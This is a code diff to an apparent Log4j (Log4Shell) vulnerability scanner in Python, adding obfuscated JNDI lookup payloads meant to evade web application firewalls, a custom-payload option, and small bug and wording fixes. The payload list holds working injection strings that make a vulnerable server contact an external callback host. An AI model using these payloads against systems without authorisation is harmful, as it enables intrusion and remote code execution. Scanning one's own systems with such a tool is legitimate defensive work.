@@ -52,11 +52,14 @@ timeout = 4
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
+                       "${jndi:rmi://{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://{{callback_host}}}/",
                        "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+                       "${jndi:dns://{{callback_host}}/{{random}}}",
+                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}}",
                        "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
                        "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
@@ -66,8 +69,11 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
                        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
                        "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
-                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}"
-                       ]
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
+                       "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
+                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
+                      ]
 
 cve_2021_45046 = [
                   "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
@@ -116,6 +122,9 @@ parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
                     action='store_true')
+parser.add_argument("--custom-waf-bypass-payload",
+                    dest="custom_waf_bypass_payload",
+                    help="Test with custom WAF bypass payload.")
 parser.add_argument("--test-CVE-2021-45046",
                     dest="cve_2021_45046",
                     help="Test using payloads for CVE-2021-45046 (detection payloads).",
@@ -151,6 +160,10 @@ if args.target_parameters:
     args.target_parameters = { i.split('=',1)[0] : i.split('=',1)[1] for i in args.target_parameters.split('&')}
 
 
+if args.custom_waf_bypass_payload:
+    waf_bypass_payloads.append(args.custom_waf_bypass_payload)
+
+
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
     fuzzing_headers.update(default_headers)
@@ -163,7 +176,8 @@ def get_fuzzing_headers(payload):
     if args.exclude_user_agent_fuzzing:
         fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
 
-    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
+    if "Referer" in fuzzing_headers:
+        fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
     return fuzzing_headers
 
 
@@ -178,7 +192,7 @@ def generate_waf_bypass_payloads(callback_host, random_string):
     payloads = []
     for i in waf_bypass_payloads:
         new_payload = i.replace("{{callback_host}}", callback_host)
-        new_payload = new_payload.replace("{{random}}", random_string)
+        new_payload = new_payload.replace("{{random}}", f'{random_string}')
         payloads.append(new_payload)
     return payloads
 
@@ -189,7 +203,6 @@ def get_cve_2021_45046_payloads(callback_host, random_string):
         new_payload = new_payload.replace("{{random}}", random_string)
         payloads.append(new_payload)
     return payloads
-
 
 class Dnslog(object):
     def __init__(self):
@@ -303,6 +316,7 @@ def scan_url(url, callback_host):
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    
     if args.cve_2021_45046:
         cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
         payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
@@ -396,9 +410,9 @@ def main():
     time.sleep(int(args.wait_time))
     records = dns_callback.pull_logs()
     if len(records) == 0:
-        cprint("[•] Targets does not seem to be vulnerable.", "green")
+        cprint("[•] Targets do not seem to be vulnerable.", "green")
     else:
-        cprint("[!!!] Target Affected", "yellow")
+        cprint("[!!!] Targets Affected", "yellow")
         for i in records:
             cprint(i, "yellow")
 
